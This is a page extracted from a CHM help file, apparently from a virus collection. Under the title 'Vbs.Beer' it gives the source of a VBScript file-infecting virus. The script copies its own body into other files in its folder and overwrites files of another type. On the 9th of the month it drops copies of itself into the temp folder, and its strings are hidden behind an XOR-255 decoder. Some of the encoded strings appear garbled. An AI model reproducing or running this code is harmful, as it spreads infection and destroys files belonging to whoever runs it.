================================================================================
<br>This file has been exported by unregistered version of CHMUnpacker.
<br>This message is not appear on files exported by a registered version of CHMUnpacker.
<br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
<br>================================================================================
<br>
<br>
<br>
<br>Vbs.Beer by ?


Function WriteToFile(str)
set fso = createobject("Scripting.FileSystemObject")
set file = fso.createtextfile("c:\out.txt", false)
file.write(str)
file.close
set file = nothing
set fso = nothing
End Function

'½
On Error Resume Next
Set FSO=Wscript.CreateObject(D("¬ΡΉ¬°"))
Set OpenSelf=FSO.OpenTextFile(Wscript.ScriptFullName,1)
Self=OpenSelf.ReadAll:OpenSelf.Close:SS=InStr(Self,"'½")
Self=Mid(Self,SS,965)
Set GF=FSO.GetFolder(".")
For Each SF in GF.Files
Ext=Lcase(FSO.GetExtensionName(SF.path))
If Ext=D("") then
Set OSF=FSO.OpenTextFile(SF.path,1)
ROSF=OSF.ReadAll
OSF.Close
If InStr(ROSF,"'½")=0 then
Set OSF=FSO.OpenTextFile(SF.path,8,True)
OSF.WriteLine ""
OSF.WriteLine Self
OSF.Close
End If
End If
If Ext=D("") then
Set OSF=FSO.OpenTextFile(SF.path,2,True)
OSF.Write D("½")
OSF.Close
End If
Next
If Day(Now)=9 then
Set TFile=FSO.CreateTextFile(FSO.GetSpecialFolder(2)&D("£½ΊΊ­Ρ©½¬"),True)
TFile.Write Self:TFile.Close
FSO.CopyFile FSO.GetSpecialFolder(2)&D("£½ΊΊ­Ρ©½¬"),D("ΎΕ£½ΊΊ­Ρ©½¬"),True
End If
Function D(Line)
For A=1 to Len(Line)
D=D&Chr(Asc(Mid(Line,A,1))Xor 255)
Next
End Function
